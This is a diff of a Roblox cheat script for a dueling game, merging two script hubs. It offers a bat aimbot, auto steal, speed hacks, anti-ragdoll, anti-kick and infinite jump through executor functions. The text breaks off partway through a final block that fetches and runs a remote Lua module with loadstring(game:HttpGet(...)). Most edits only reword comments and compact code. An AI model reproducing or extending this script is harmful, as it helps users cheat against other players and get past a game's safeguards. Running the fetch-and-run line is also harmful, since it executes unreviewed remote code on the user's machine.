@@ -7,7 +7,7 @@ local HS = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
 -- ------------------------------------------------------------
--- EARLY CONFIG LOAD (for intro sound setting)
+-- EARLY CONFIG LOAD
 -- ------------------------------------------------------------
 local introSoundEnabled = true
 if isfile and isfile("moveeduels.json") then
@@ -18,18 +18,14 @@ if isfile and isfile("moveeduels.json") then
 end
 
 -- ------------------------------------------------------------
--- INTRO SOUND (only if enabled) – now uses new filename and always redownloads
+-- INTRO SOUND
 -- ------------------------------------------------------------
 local introSoundInstance = nil
 if introSoundEnabled then
     local urlIntro = "https://files.catbox.moe/hg5cr4.mp3"
     local numeFisier = "movee_intro.mp3"
-
     local ok, data = pcall(function() return game:HttpGet(urlIntro) end)
-    if ok and data then
-        pcall(function() writefile(numeFisier, data) end)
-    end
-
+    if ok and data then pcall(function() writefile(numeFisier, data) end) end
     introSoundInstance = Instance.new("Sound")
     pcall(function()
         introSoundInstance.SoundId = getcustomasset(numeFisier)
@@ -43,7 +39,7 @@ end
 repeat task.wait() until game:IsLoaded()
 
 -- ============================================================
--- SKY THEME SYSTEM (unchanged from Movee)
+-- SKY THEME SYSTEM (Movee)
 -- ============================================================
 local CANDY_SKY_TAG = "MoveeSkyTheme"
 local currentSkyTheme = "Night"
@@ -104,7 +100,7 @@ local function CandyApplyCustomSky(mode)
 end
 
 -- ============================================================
--- STATE (expanded with new visual features)
+-- STATE (Movee + new visual features from Green Duels)
 -- ============================================================
 local TS=TweenService
 local LP=Players.LocalPlayer
@@ -114,7 +110,7 @@ local LAGGER_CARRY_SPEED=24.5
 local carrySpeedActive = false
 local laggerModeEnabled = false
 
--- Anti-Ragdoll state will be redefined
+-- ANTI-RAGDOLL (new version)
 local antiRagdollEnabled = false
 local infJumpEnabled = false
 local medusaCounterEnabled,batCounterEnabled,unwalkEnabled = false,false,false
@@ -166,13 +162,11 @@ local holdInfJumpConn=nil
 local DROP_ASCEND_DURATION=0.2
 local DROP_ASCEND_SPEED=150
 
--- New visual features from Green Duels V2
+-- New visual features
 local nukeOptEnabled = false
 local removeAccEnabled = false
 local tryardAnimEnabled = false
-local enemySpeedEnabled = true  -- always on
-
--- FOV lock
+local enemySpeedEnabled = true
 local _VezyFOV = 70
 local _VezyFOVPropConn = nil
 
@@ -222,7 +216,7 @@ local startBatAimbot,stopBatAimbot,queueAutoBatStart,runDrop,runTPFloor,cursedIn
 local startAutoSteal,stopAutoSteal,enableAntiKick,disableAntiKick,toggleCarryMode,toggleLaggerMode
 
 -- ============================================================
--- ANTI-RAGDOLL (NEW - from message-5, undetected)
+-- ANTI-RAGDOLL (NEW - from message-5)
 -- ============================================================
 local antiRagdollCached = {}
 local antiRagdollConn = nil
@@ -313,7 +307,7 @@ stopAntiRagdoll = function()
 end
 
 -- ============================================================
--- TRYARD ANIMATION PACK (from Green Duels V2)
+-- TRYARD ANIMATION (Green Duels)
 -- ============================================================
 local function isTryardPackAnim(id) for _,v in pairs(TryardAnims) do if v==id then return true end end return false end
 local function saveOriginalTryardAnims(char)
@@ -385,7 +379,7 @@ local function startTryardAnim()
 end
 
 -- ============================================================
--- NUKE OPTIMIZER (from Green Duels V2)
+-- NUKE OPTIMIZER (Green Duels)
 -- ============================================================
 local function _nukeSafeDestroy(obj) if obj.Name=="Overhead" then return end pcall(function() obj:Destroy() end) end
 local function _nukeIsClothing(obj)
@@ -435,7 +429,7 @@ local function _nukeStop()
 end
 
 -- ============================================================
--- REMOVE ACCESSORIES (from Green Duels V2)
+-- REMOVE ACCESSORIES (Green Duels)
 -- ============================================================
 local function _removeAccDo()
     if not _RemoveAccOn then return end
@@ -454,7 +448,7 @@ local function _removeAccStop()
 end
 
 -- ============================================================
--- FOV LOCK (from Green Duels V2)
+-- FOV LOCK (Green Duels)
 -- ============================================================
 local function _attachFOVLock(cam)
     if not cam then return end
@@ -467,7 +461,7 @@ local function _attachFOVLock(cam)
 end
 
 -- ============================================================
--- ENEMY SPEED DISPLAY (from Green Duels V2)
+-- ENEMY SPEED DISPLAY (Green Duels)
 -- ============================================================
 local function setupOtherPlayerSpeed(plr)
     if plr == LP then return end
@@ -501,6 +495,9 @@ local function setupOtherPlayerSpeed(plr)
     if plr.Character then addBillboard(plr.Character) end
 end
 
+-- ============================================================
+-- SHIMMER & FOV (Movee)
+-- ============================================================
 local function addShimmerToLabel(lbl,color1,color2)
     local gr=Instance.new("UIGradient",lbl)
     gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(255,105,180)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(255,105,180))})
@@ -514,6 +511,9 @@ local function applyFOV()
 end
 applyFOV()
 
+-- ============================================================
+-- RAGDOLL BILLBOARD (Movee)
+-- ============================================================
 local function createRagdollBillboard(duration,labelText,color)
     if not ragdollGuiEnabled then return nil end
     local PINK  = color or Color3.fromRGB(255,105,180)
@@ -582,6 +582,10 @@ local function createRagdollBillboard(duration,labelText,color)
     end)
     return sg
 end
+
+-- ============================================================
+-- RAGDOLL TRIGGERS & SPEED INDICATOR (Movee)
+-- ============================================================
 local function onHumanoidStateChanged(old,new)
     local char=LP.Character;if not char then return end
     local hum=char:FindFirstChildOfClass("Humanoid");if not hum then return end
@@ -616,6 +620,10 @@ local function setupSpeedIndicator(char)
     local gr2=addShimmerToLabel(discordLabel,Color3.fromRGB(255,150,200),Color3.fromRGB(255,255,255))
     task.spawn(function() local t=0;while bb and bb.Parent do t=t+0.03;gr1.Offset=Vector2.new(math.sin(t)*0.4,0);gr2.Offset=Vector2.new(math.sin(t)*0.4,0);task.wait(0.04) end end)
 end
+
+-- ============================================================
+-- SPEED FUNCTIONS (Movee)
+-- ============================================================
 local function getActiveMoveSpeed()
     if laggerModeEnabled and carrySpeedActive then return LAGGER_CARRY_SPEED
     elseif laggerModeEnabled then return LAGGER_SPEED
@@ -821,7 +829,7 @@ RunService.Stepped:Connect(function()
 end)
 
 -- ============================================================
--- BAT AIMBOT (REPLACED with Green Duels V2 version)
+-- BAT AIMBOT (Green Duels V2)
 -- ============================================================
 local AUTO_BAT_SPEED = 58
 local AUTO_BAT_VERT_SPEED = 52
@@ -974,7 +982,7 @@ resetAutoBatMotion = function()
 end
 
 -- ============================================================
--- REST OF RUNTIME (unchanged)
+-- RUNTIME (Movee)
 -- ============================================================
 RunService.RenderStepped:Connect(function()
     local char=LP.Character;if not char then return end
@@ -1198,7 +1206,7 @@ saveConfig=function()
         else return {kb=nil,gp=nil} end
     end
     local cfg={normalSpeed=NS,carrySpeed=CS,dropBrainrotKey=ks(KB.DropBrainrot),autoLeftKey=ks(KB.AutoLeft),autoRightKey=ks(KB.AutoRight),autoBatKey=ks(KB.AutoBat),laggerToggleKey=ks(KB.LaggerToggle),tpFloorKey=ks(KB.TPFloor),instaResetKey=ks(KB.InstaReset),guiHideKey=ks(KB.GuiHide),speedToggleKey=ks(KB.SpeedToggle),grabRadius=Steal.StealRadius,stealDuration=Steal.StealDuration,antiRagdoll=antiRagdollEnabled,autoStealEnabled=Steal.AutoStealEnabled,infiniteJump=infJumpEnabled,infJumpMode=infJumpMode,medusaCounter=medusaCounterEnabled,batCounter=batCounterEnabled,carrySpeedActive=carrySpeedActive,laggerModeEnabled=laggerModeEnabled,laggerSpeed=LAGGER_SPEED,laggerCarrySpeed=LAGGER_CARRY_SPEED,autoBat=autoBatEnabled,autoSwing=autoSwingEnabled,unwalkEnabled=unwalkEnabled,antiLag=antiLagEnabled,stretchRez=stretchRezEnabled,autoTPEnabled=autoTPEnabled,autoTPHeight=autoTPHeight,guiTransparencyEnabled=guiTransparencyEnabled,mobileButtonsEnabled=mobileButtonsEnabled,mobileButtonsLocked=mobileButtonsLocked,mobileButtonsSize=mobileButtonsSize,circleButtonsEnabled=circleButtonsEnabled,autoSwitchSpeed=autoSwitchSpeedEnabled,antiKick=antiKickEnabled,fovValue=fovValue,perButtonDrag=perButtonDragEnabled,skyTheme=currentSkyTheme,medusaReset=medusaResetEnabled,autoMoveSwing=autoMoveSwingEnabled,autoMoveSwingInterval=autoMoveSwingInterval,ragdollGui=ragdollGuiEnabled,introSoundEnabled=introSoundEnabled,
-        nukeOpt=nukeOptEnabled, removeAcc=removeAccEnabled, tryardAnim=tryardAnimEnabled}
+        nukeOpt=nukeOptEnabled, removeAcc=removeAccEnabled, tryardAnim=tryardAnimEnabled, fovLock=_VezyFOV}
     if writefile then pcall(function() writefile("moveeduels.json",HS:JSONEncode(cfg)) end) end
 end
 task.spawn(function() while task.wait(5) do saveConfig() end end)
@@ -1212,7 +1220,7 @@ local function resetAllSettings()
     guiTransparencyEnabled=false;mobileButtonsEnabled=true;mobileButtonsSize=80
     circleButtonsEnabled=false;antiKickEnabled=false;uiLocked=false;fovValue=80;fovIndex=1
     introSoundEnabled=true
-    nukeOptEnabled=false; removeAccEnabled=false; tryardAnimEnabled=false
+    nukeOptEnabled=false; removeAccEnabled=false; tryardAnimEnabled=false; _VezyFOV=70
     _NukeOn=false; _RemoveAccOn=false
     KB.DropBrainrot={kb=nil,gp=nil};KB.AutoLeft={kb=nil,gp=nil};KB.AutoRight={kb=nil,gp=nil}
     KB.AutoBat={kb=nil,gp=nil};KB.TPFloor={kb=nil,gp=nil};KB.InstaReset={kb=nil,gp=nil}
@@ -1274,7 +1282,7 @@ end
 stopUnwalk=function() local c=LP.Character;if c and unwalkSavedAnimate then unwalkSavedAnimate:Clone().Parent=c;unwalkSavedAnimate=nil end end
 
 -- ============================================================
--- STEAL BAR
+-- STEAL BAR (Movee)
 -- ============================================================
 local function createStealBar()
     for _,n in ipairs({"MoveeStealBar"}) do
@@ -1375,7 +1383,7 @@ local function createStealBar()
         end
     end)
 end-- ============================================================
--- MOBILE BUTTONS (unchanged from Movee)
+-- MOBILE BUTTONS (Movee)
 -- ============================================================
 local C_BTN_OFF_TRANSPARENCY_GLOBAL=0.15
 
@@ -1633,7 +1641,7 @@ local function buildGui()
     pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
     if not pcall(function() gui.Parent=game:GetService("CoreGui") end) then gui.Parent=LP:WaitForChild("PlayerGui") end
 
-    local W, H = 330, 360 -- slightly taller to fit new toggles
+    local W, H = 330, 380 -- slightly taller to fit new toggles
     mainFrame=Instance.new("Frame",gui);mainFrame.Name="Main"
     mainFrame.Size=UDim2.new(0,W,0,H);mainFrame.Position=UDim2.new(0,20,0,20)
     mainFrame.BackgroundColor3=BG;mainFrame.BackgroundTransparency=guiTransparencyEnabled and 0.65 or 0
@@ -1921,7 +1929,7 @@ local function buildGui()
         return tb
     end
 
-    -- Keybind helpers (unchanged)
+    -- Keybind helpers
     local GAMEPAD_KEYS={[Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true,[Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true,[Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,[Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true}
     local function isGamepadInput(inp) return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad")~=nil end
     local function isBindableInput(inp)
@@ -2002,7 +2010,7 @@ local function buildGui()
         return row,btn
     end
 
-    -- ===== SPEED TAB (unchanged) =====
+    -- ===== SPEED TAB =====
     local pg=tabPages["Speed"]
     mkSectionLbl(pg,"Speed Configuration")
     mkSectionLbl(pg,"Normal Mode")
@@ -2135,7 +2143,7 @@ local function buildGui()
         holdBtn.Activated:Connect(function() infJumpMode="hold";holdBtn.BackgroundColor3=PINK2;manualBtn.BackgroundColor3=Color3.fromRGB(50,30,40);if infJumpEnabled then startHoldInfJump() end;saveConfig() end)
     end
 
-    -- ===== STEAL TAB (unchanged) =====
+    -- ===== STEAL TAB =====
     pg=tabPages["Steal"]
     mkSectionLbl(pg,"Steal")
     radInput=mkBoxRow(pg,"Steal Radius",Steal.StealRadius,function(v) if v>=0.5 and v<=300 then Steal.StealRadius=v end;saveConfig() end)
@@ -2178,11 +2186,7 @@ local function buildGui()
     -- NEW: Nuke Optimizer (Green Duels)
     local nukeToggle = mkToggle(pg, "Nuke Optimizer", function(on)
         nukeOptEnabled = on
-        if on then
-            _nukeStart()
-        else
-            _nukeStop()
-        end
+        if on then _nukeStart() else _nukeStop() end
         saveConfig()
     end)
     if nukeOptEnabled then nukeToggle(true) end
@@ -2190,28 +2194,20 @@ local function buildGui()
     -- NEW: Remove Accessories (Green Duels)
     local removeAccToggle = mkToggle(pg, "Remove Accessories", function(on)
         removeAccEnabled = on
-        if on then
-            _removeAccStart()
-        else
-            _removeAccStop()
-        end
+        if on then _removeAccStart() else _removeAccStop() end
         saveConfig()
     end)
     if removeAccEnabled then removeAccToggle(true) end
 
-    -- NEW: Tryard Animation Pack (Green Duels)
+    -- NEW: Tryard Animation (Green Duels)
     local tryardToggle = mkToggle(pg, "Tryard Animation", function(on)
         tryardAnimEnabled = on
-        if on then
-            startTryardAnim()
-        else
-            stopTryardAnim()
-        end
+        if on then startTryardAnim() else stopTryardAnim() end
         saveConfig()
     end)
     if tryardAnimEnabled then tryardToggle(true) end
 
-    -- NEW: FOV (normal) – adjust normal FOV
+    -- NEW: FOV Lock (normal FOV)
     makeInputRow("FOV (normal)", _VezyFOV, function(n)
         if n >= 70 and n <= 180 then
             _VezyFOV = n
@@ -2270,7 +2266,7 @@ local function buildGui()
         resetBtn.Activated:Connect(function() resetAllSettings() end)
     end
 
-    -- ===== INTERFACE TAB (unchanged) =====
+    -- ===== INTERFACE TAB =====
     pg=tabPages["Interface"]
     mkSectionLbl(pg,"Interface")
     setTranspVisual=mkToggle(pg,"GUI Transparent",function(on) guiTransparencyEnabled=on;applyTransparencyToGui(on);saveConfig() end)
@@ -2373,7 +2369,7 @@ local function buildGui()
 end
 
 -- ============================================================
--- LOAD/SAVE CONFIG (updated with new visual settings)
+-- LOAD/SAVE CONFIG
 -- ============================================================
 local _savedCfg=nil
 local function loadConfigKeys()
@@ -2449,9 +2445,7 @@ local function loadConfigState()
         if cfg.skyTheme then CandyApplyCustomSky(cfg.skyTheme) end
         if cfg.introSoundEnabled ~= nil then introSoundEnabled = cfg.introSoundEnabled end
         if cfg.nukeOpt then
-            nukeOptEnabled=true
-            _nukeStart()
-            local nukeToggle = nil
+            nukeOptEnabled=true; _nukeStart()
             for _,child in ipairs(tabPages["Visual"]:GetDescendants()) do
                 if child:IsA("Frame") and child:FindFirstChildOfClass("TextLabel") then
                     local lbl = child:FindFirstChildOfClass("TextLabel")
@@ -2467,9 +2461,7 @@ local function loadConfigState()
             end
         end
         if cfg.removeAcc then
-            removeAccEnabled=true
-            _removeAccStart()
-            local removeAccToggle = nil
+            removeAccEnabled=true; _removeAccStart()
             for _,child in ipairs(tabPages["Visual"]:GetDescendants()) do
                 if child:IsA("Frame") and child:FindFirstChildOfClass("TextLabel") then
                     local lbl = child:FindFirstChildOfClass("TextLabel")
@@ -2485,9 +2477,7 @@ local function loadConfigState()
             end
         end
         if cfg.tryardAnim then
-            tryardAnimEnabled=true
-            startTryardAnim()
-            local tryardToggle = nil
+            tryardAnimEnabled=true; startTryardAnim()
             for _,child in ipairs(tabPages["Visual"]:GetDescendants()) do
                 if child:IsA("Frame") and child:FindFirstChildOfClass("TextLabel") then
                     local lbl = child:FindFirstChildOfClass("TextLabel")
@@ -2537,6 +2527,7 @@ for _, plr in ipairs(Players:GetPlayers()) do
 end
 Players.PlayerAdded:Connect(setupOtherPlayerSpeed)
 
+-- Load external module (optional)
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/7kDesync/k7mini/main/k7_mini.lua"))()
